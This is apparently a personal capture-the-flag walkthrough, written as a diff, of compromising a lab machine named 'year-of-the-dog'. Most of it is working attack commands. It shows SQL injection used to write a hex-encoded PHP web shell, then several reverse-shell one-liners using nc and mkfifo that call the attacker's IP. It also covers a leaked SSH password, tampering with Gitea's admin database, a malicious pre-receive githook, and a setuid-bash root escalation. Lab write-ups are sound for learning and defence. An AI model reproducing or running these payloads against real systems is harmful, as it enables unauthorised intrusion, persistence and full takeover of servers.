@@ -1,0 +1,209 @@
+NMAP Scan
+	sudo nmap -p- -vv -A -O -Pn -sC -sV 10.10.216.104
+After this I did a dirbuster however could not find anything
+I decided to use burpsuite but was not getting far, I did notice that my ID number was weird and very long
+I decided to put an ' at the end of ID and all of sudden got a syntax error for a MySQL server
+This is good news we may be able to do a php command injection
+First I thought lets try to become number one
+	id=                    ' union select 1, table_name FROM information_schema.tables-- -
+Lets see if we can pull the version number
+	id=                    ' union select 1, @@version-- -
+We got a version number
+	You are number 5.7.31-0ubuntu0.18.04.1 in the queue
+Now we need to change out attack into hex format, this is so we can actually conduct the attack and none of our
+stuff is sanitized
+	<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>
+hex format
+	3c3f706870206563686f20223c7072653e22202e207368656c6c5f6578656328245f4745545b22636d64225d29202e20223c2f7072653e223b3f3e
+Now lets try to get into shell.php
+	id=               ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
+Now we get that we are error in the queue
+	Lets go to our IP address/shell.php and see if we can get in (dont forget to turn off burpsuite)
+We are getting somewhere
+	Now lets give it a command and see if we are actually in
+http://10.10.216.104/shell.php?cmd=whoami
+	We can see that we are in and that we are www-data
+Now we can try to upload a rev shell
+I grabbed a reverse php shell from pentest monkey and changed it to match my information
+	php -r '$sock=fsockopen("10.9.124.138",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+After this I needed to put the shell.php file that I made to /var/www/html
+From here I then need to open a simple http server
+	python -m SimpleHTTPserver 6666
+I then need to upload all of this into the web
+	http://10.10.216.104/shell.php?cmd=wget "http://10.9.124.138:6666/shell.php" -O /tmp/revshell.php
+I put the shell.php into the database under /tmp/revshell.php
+	Start a netcat listener
+nc -lnvp 4444
+	Now get a reverse shell with curl command
+curl -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.124.138 4444 >/tmp/f' http://10.10.171.102/shell.php
+Go back to your netcat listener and you can see that we are now in the system, this is good
+As i moved through the system I was able to cd back to home
+From there I noticed a dylan
+	cd dylan
+	ls -la
+The shell is ok, lets see if we can make it better and a little more stable
+	python3 -c "import pty;pty.spawn('/bin/bash')"
+That did something
+	Ok now lets start looking around
+So... now I was pretty stuck, talked to some people and learned that dylan may have typed in his password incorrectly, maybe in the username field
+Where do logs go that are not allowed? /dev/null
+lets take a look at that
+	grep dylan -Ri 2>/dev/null
+We see that he typed in his username wrong and put the password with it
+	Now we have a username and password
+	work_analysis:Sep  5 20:53:03 staging-server sshd[39218]: Failed password for invalid user dylanLabr4d0rs4L1f3 from 192.168.1.142 port 45624 ssh2 
+We can then cat user.txt
+However we are stuck again, we cannot do anything as dylan
+Lets see if there are other ports on, we cannot use svn this time, however we can use ss -ltn
+	We see that there are other ports open that are only used for the internal hosts
+LISTEN   0         128               127.0.0.1:3000             0.0.0.0:*       
+LISTEN   0         128               127.0.0.1:39017            0.0.0.0:*       
+LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*      
+
+3306 is a MYSQL port
+Port 3000 and 39017 are two ports of interest
+
+dylan@year-of-the-dog:~$ curl 127.0.0.1:39017
+curl 127.0.0.1:39017
+404: Page Not Founddylan@year-of-the-dog:~$ 
+
+10.10.171.102 Ok that doesnt have much in it
+
+curl 127.0.0.1:3000
+
+Now we found a little more
+	We found quite a few things about Gitea, which is like github and other sites such as that
+Now lets intercept traffic using ssh that is bound for port 3000 and send it to our local machine
+	Open a terminal in Kali
+ssh -N -L 3000:127.0.0.1:3000 dylan@10.10.171.102
+	Open another terminal in kali
+ssh -l dylan 10.10.171.102
+
+dylan@year-of-the-dog:~$ ss -tln
+
+State        Recv-Q         Send-Q                  Local Address:Port                  Peer Address:Port        
+LISTEN       0              128                           0.0.0.0:22                         0.0.0.0:*           
+LISTEN       0              128                         127.0.0.1:3000                       0.0.0.0:*           
+LISTEN       0              128                         127.0.0.1:39017                      0.0.0.0:*           
+LISTEN       0              80                          127.0.0.1:3306                       0.0.0.0:*           
+LISTEN       0              128                     127.0.0.53%lo:53                         0.0.0.0:*           
+LISTEN       0              128                              [::]:22                            [::]:*           
+LISTEN       0              128                             [::1]:3000                          [::]:*           
+LISTEN       0              128                                 *:80                               *:*           
+
+Now looking at the second to bottom listing we can see another port opened on port 3000 lets try that
+open the web browser 
+	http://127.0.0.1:3000/
+We are now in their Git page
+Now sign in as dylan
+There is 2FA... shit...
+We are stuck again... but I think we may have something else
+When looking through the 3000 port I saw the version number, lets see if we can use that to do something
+
+<footer>
+        <div class="ui container">
+                <div class="ui left">
+                        Powered by Gitea Version: 1.13.0&#43;dev-542-gbc11caff9 Page: <strong>0ms</strong> Template: <strong>0ms</strong>
+                </div>
+                <div class="ui right links">
+
+                        <div class="ui language bottom floating slide up dropdown link item">
+                                <i class="world icon"></i>
+                                <div class="text">English</div>
+                                <div class="menu">
+
+Ok we are using Gitea Version: 1.13.0 dev-542
+Lets see if we can find something for that
+
+CVE-2019-11576 allows for 1FA even when 2FA has been setup, that sounds excalty like what we need right now
+
+https://github.com/kacperszurek/exploits/blob/master/Gitea/gitea_lfs_rce.md shows how to conduct the attack 
+
+What is even better about this exploit is that we do not even need to do too much, we just change the header
+This will allow us to be able to login using "2FA" without ever even trying
+
+Ok... so after messing around for a while I realized I got nowhere. Time for a different approach
+I said screw it and made an account, When i was looking through SSH earlier I found a gitea directory
+	lets see if we can do anything with this
+as I look through the gitea directory i found a database, we have SSHed in so lets try and use SCP to send that to myself
+	I already tried to look at it with sqlite3 but it was not installed on the shell
+dylan@year-of-the-dog:/gitea/gitea$ scp dylan@10.10.171.102:/gitea/gitea/gitea.db /tmp/gitea.db
+	Now go back to your kali console
+kali@kali:~$ scp dylan@10.10.171.102:/gitea/gitea/gitea.db /tmp/gitea.db
+sqlite3 /tmp/gitea.db
+SELECT * FROM user;
+	now we get more information (we can see 2 users, one that we created and Dylan Anderson)
+SELECT lower_name, is_admin FROM user;
+	This will allow us to see who has admin priveleges
+Lets change ourselves to have admin privs
+	UPDATE user SET is_admin=1 WHERE lower_name="test";
+Now exit with .exit
+We have made ourselves an admin, so hopefully we can do something with this, but first we need to reupload the database
+scp /tmp/gitea.db dylan@10.10.171.102:/gitea/gitea/gitea.db
+	Now put in his password...again
+	Labr4d0rs4L1f3
+Well... I was hoping that after I became an admin I could just delete his 2FA, this was not so much the case
+Lets go back into the database and just delete it...
+	not really setting ourselves up for persistance
+Ok... after stepping outside and thinking about it I thought that is bullshit Ryan, and a stupid move
+We are not just going to delete 2FA and make this easier, we are going to run a script utilizing githooks
+	A githook is something that is ran whenever something is downloaded, we can run a listener in the githook...
+Go to site administrator
+click on dylan
+click on test-repo
+click on settings
+click on githook
+Now click on pre-recieve
+mkfifo /tmp/f; nc 10.9.124.138 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (remember to change your IP and listening port)
+
+Go to a kali console and turn on a listening port for 4444
+nc -lvnp 4444
+
+Now go to Dylans SSH shell that we have
+git clone http://localhost:3000/Dylan/Test-Repo && cd Test-Repo
+git add README.md
+git commit -m "Exploit"
+git push
+for username I used test
+
+now look at your listener
+whoami
+
+sudo -l
+
+cat /root/root.txt
+NOPE
+
+wait a minute though, lets try a sudo -s
+whoami
+root
+
+Getting further... although this is not a good shell and not very stable
+
+doing an ifconfig we can see that we have a 172 IP address, that is new
+Lets move what Dylan has over to this box that we have root on...
+
+Now lets copy bash to the root cli we have
+First go to dylan
+	cp bin/bash var/www/html
+	python3 -m http.server
+now go back to root
+	wget 172.17.0.1:8000/bash -O /data/bash
+	cd /data
+	ls -la
+	chmod 4755 bash
+	ls -la
+we can see that we now have an s
+	an s states there are special permissions for the user, this allows us to run a file and gain the permissions of the person who made it, in this case root
+Go back to dylan and stop the python server
+now go to cd /gitea
+and we can do an ls -la and see that bash is highlighted in red... good!!!
+./bash
+whoami 
+	dylan
+./bash -p
+whoami
+	root
+ALRIGHT!!! CAN WE DO THIS!!!
+cat /root/root.txt
+
